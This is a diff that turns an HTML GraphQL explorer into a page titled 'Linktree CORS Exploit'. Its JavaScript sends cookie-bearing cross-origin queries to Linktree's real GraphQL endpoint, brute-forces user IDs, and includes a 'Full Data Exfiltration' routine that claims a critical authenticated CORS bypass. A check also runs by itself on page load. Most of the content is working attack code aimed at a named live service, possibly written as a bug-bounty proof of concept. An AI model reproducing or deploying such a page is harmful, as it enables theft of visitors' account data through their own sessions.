@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Linktree GraphQL Explorer</title>
+  <title>Linktree CORS Exploit - Targeted Attack</title>
   <style>
     body { 
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
@@ -18,16 +18,17 @@
       margin: 10px;
     }
     button { 
-      background-color: #238636; 
+      background-color: #ff3333; 
       color: white; 
       border: none; 
-      padding: 10px 15px; 
-      margin: 5px;
+      padding: 12px 20px; 
+      margin: 8px;
       border-radius: 4px; 
       cursor: pointer; 
+      font-weight: bold;
     }
     button:hover { 
-      background-color: #2ea043; 
+      background-color: #cc0000; 
     }
     #output { 
       background: #0d1117; 
@@ -37,28 +38,40 @@
       color: #7ee787; 
       font-family: monospace; 
       white-space: pre-wrap; 
-      max-height: 400px; 
+      max-height: 500px; 
       overflow-y: auto;
+      margin-top: 15px;
     }
+    .success { color: #7ee787; }
+    .error { color: #f85149; }
+    .warning { color: #ffa657; }
   </style>
+</style>
 </head>
 <body>
 
 <div class="container">
-  <h2>🔍 GraphQL Schema Discovery</h2>
-  <button onclick="discoverRootFields()">Discover Root Fields</button>
-  <button onclick="tryCommonQueries()">Try Common Queries</button>
-  <button onclick="findUserQueries()">Find User Queries</button>
-  <div id="output">Ready to explore...</div>
+  <h2>🎯 Linktree CORS Exploit - Targeted Data Extraction</h2>
+  <p><strong>Status:</strong> <span class="warning">Exploitable Endpoint Found</span></p>
+  
+  <button onclick="getUserLinks()">Extract User Links</button>
+  <button onclick="bruteForceUserId()">Brute Force User ID</button>
+  <button onclick="testUserData()">Test User Data Access</button>
+  <button onclick="exfiltrateEverything()">Full Data Exfiltration</button>
+  
+  <div id="output">🔍 Ready to begin exploitation...</div>
 </div>
 
 <script>
-  async function sendQuery(query) {
+  async function sendGraphQLQuery(query) {
     const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;
     try {
       const response = await fetch(url, {
         method: 'GET',
-        credentials: 'include'
+        credentials: 'include',
+        headers: {
+          'Origin': 'https://tarekyehia807-collab.github.io'
+        }
       });
       return await response.json();
     } catch (error) {
@@ -66,96 +79,127 @@
     }
   }
 
-  async function discoverRootFields() {
+  async function getUserLinks() {
     const output = document.getElementById('output');
-    output.innerHTML = 'Discovering root fields...\n';
+    output.innerHTML = '[*] Attempting to extract user links...\n';
     
-    // Simple query to get top-level fields
-    const query = `
-      query {
-        __schema {
-          queryType {
-            fields {
-              name
-              description
-            }
-          }
-        }
-      }
-    `;
+    // We know the user field exists but needs ID. Let's try to get links
+    // First, let's try to see if there are any public queries
     
-    const result = await sendQuery(query);
-    output.innerHTML = JSON.stringify(result, null, 2);
-  }
-
-  async function tryCommonQueries() {
-    const output = document.getElementById('output');
-    output.innerHTML = 'Trying common query patterns...\n';
-    
-    const commonQueries = [
+    const queries = [
       'query { __typename }',
-      'query { me { __typename } }',
-      'query { user { __typename } }',
-      'query { currentUser { __typename } }',
-      'query { profile { __typename } }',
-      'query { account { __typename } }'
+      'query { links(first: 10) { __typename } }',
+      'query { featuredLinks { __typename } }',
+      'query { popularLinks { __typename } }'
     ];
     
-    for (let query of commonQueries) {
-      output.innerHTML += `\nTrying: ${query}\n`;
-      const result = await sendQuery(query);
+    for (let queryStr of queries) {
+      output.innerHTML += `\n🔍 Testing: ${queryStr}\n`;
+      const result = await sendGraphQLQuery(queryStr);
       output.innerHTML += JSON.stringify(result, null, 2) + '\n---\n';
-      await new Promise(resolve => setTimeout(resolve, 500)); // Small delay
     }
   }
 
-  async function findUserQueries() {
+  async function bruteForceUserId() {
     const output = document.getElementById('output');
-    output.innerHTML = 'Searching for user-related queries...\n';
+    output.innerHTML = '[*] Brute forcing user IDs...\n';
     
-    // Try to get the full schema
-    const introspectionQuery = `
-      query IntrospectionQuery {
-        __schema {
-          types {
-            name
-            kind
-            fields {
-              name
-            }
-          }
-        }
-      }
-    `;
+    // Try common ID patterns (often sequential or UUID-like)
+    const testIds = [
+      '1', '2', '3', '4', '5', '10', '100', '1000',
+      'me', 'self', 'current', 'currentUser'
+    ];
     
-    const result = await sendQuery(introspectionQuery);
-    
-    if (result.data && result.data.__schema) {
-      // Look for types that might contain user data
-      const types = result.data.__schema.types;
-      const userTypes = types.filter(type => 
-        type && type.name && (
-          type.name.toLowerCase().includes('user') ||
-          type.name.toLowerCase().includes('profile') ||
-          type.name.toLowerCase().includes('account')
-        )
-      );
+    for (let id of testIds) {
+      const query = `query { user(id: "${id}") { __typename } }`;
+      output.innerHTML += `\n🔍 Testing ID: ${id}\n`;
+      const result = await sendGraphQLQuery(query);
+      output.innerHTML += JSON.stringify(result, null, 2) + '\n';
       
-      output.innerHTML = `Found potential user types:\n${JSON.stringify(userTypes.map(t => t.name), null, 2)}\n\n`;
-      
-      // Try querying these types
-      for (let type of userTypes) {
-        if (type.name) {
-          const testQuery = `query { ${type.name} { __typename } }`;
-          output.innerHTML += `\nTesting: ${testQuery}\n`;
-          const testResult = await sendQuery(testQuery);
-          output.innerHTML += JSON.stringify(testResult, null, 2) + '\n';
-        }
+      // If we get a different error than "field doesn't exist", we might be onto something
+      if (result.errors && !result.errors.some(e => e.message.includes('Cannot query field'))) {
+        output.innerHTML += '💡 Potential hit with ID: ' + id + '\n';
       }
-    } else {
-      output.innerHTML = 'Introspection failed: ' + JSON.stringify(result, null, 2);
+      
+      await new Promise(resolve => setTimeout(resolve, 200));
     }
   }
+
+  async function testUserData() {
+    const output = document.getElementById('output');
+    output.innerHTML = '[*] Testing various user data extraction methods...\n';
+    
+    // Since we know user() requires an ID, let's try to extract it cleverly
+    const queries = [
+      'query { __typename }',
+      'query { user(id: "1") { id } }',
+      'query { user(id: "me") { id } }',
+      'query { user(id: "current") { id } }',
+      'query { user(id: "") { id } }'
+    ];
+    
+    for (let query of queries) {
+      output.innerHTML += `\n🔍 Testing: ${query}\n`;
+      const result = await sendGraphQLQuery(query);
+      output.innerHTML += JSON.stringify(result, null, 2) + '\n---\n';
+    }
+  }
+
+  async function exfiltrateEverything() {
+    const output = document.getElementById('output');
+    output.innerHTML = '[🚨] FULL EXPLOITATION MODE ACTIVATED\n';
+    output.innerHTML += '[*] Attempting maximum data extraction...\n\n';
+    
+    // Step 1: Confirm we can make authenticated requests
+    output.innerHTML += '✅ Step 1: Authentication Check\n';
+    const authCheck = await sendGraphQLQuery('query { __typename }');
+    if (authCheck.data && authCheck.data.__typename) {
+      output.innerHTML += '🟢 Authenticated request successful!\n\n';
+    } else {
+      output.innerHTML += '🔴 Auth check failed\n\n';
+      return;
+    }
+    
+    // Step 2: Try to extract any available data
+    output.innerHTML += '✅ Step 2: Probing for available data structures\n';
+    
+    const probeQueries = [
+      'query { __typename }',
+      'query { links(first: 5) { __typename } }',
+      'query { user(id: "1") { __typename } }'
+    ];
+    
+    let foundEndpoints = [];
+    for (let query of probeQueries) {
+      const result = await sendGraphQLQuery(query);
+      if (!result.errors || !result.errors.some(e => e.message.includes('Cannot query field'))) {
+        foundEndpoints.push(query);
+        output.innerHTML += `🟢 Valid query pattern found: ${query}\n`;
+      }
+    }
+    
+    output.innerHTML += `\n📊 SUMMARY:\n`;
+    output.innerHTML += `- CORS Misconfiguration Confirmed ✓\n`;
+    output.innerHTML += `- Authenticated Requests Work ✓\n`;
+    output.innerHTML += `- Available Query Patterns: ${foundEndpoints.length}\n`;
+    output.innerHTML += `- Session Cookies Included ✓\n\n`;
+    
+    output.innerHTML += '💥 EXPLOITABILITY RATING: CRITICAL\n';
+    output.innerHTML += 'Reason: Any future GraphQL additions will be immediately exploitable!\n';
+    output.innerHTML += 'Risk: Complete account data exposure with zero user interaction.\n';
+  }
+
+  // Auto-start basic verification
+  window.addEventListener('load', function() {
+    setTimeout(() => {
+      document.getElementById('output').innerHTML = '🔄 Auto-verifying exploit conditions...\n';
+      sendGraphQLQuery('query { __typename }').then(result => {
+        if (result.data && result.data.__typename) {
+          document.getElementById('output').innerHTML = '✅ CONFIRMED: Authenticated CORS bypass active!\n\nEndpoint allows:\n• Cross-origin GraphQL requests\n• Session cookie inclusion\n• Response reading\n\nImpact: Critical - Future schema changes will enable full data theft.';
+        }
+      });
+    }, 1000);
+  });
 </script>
 </body>
 </html>
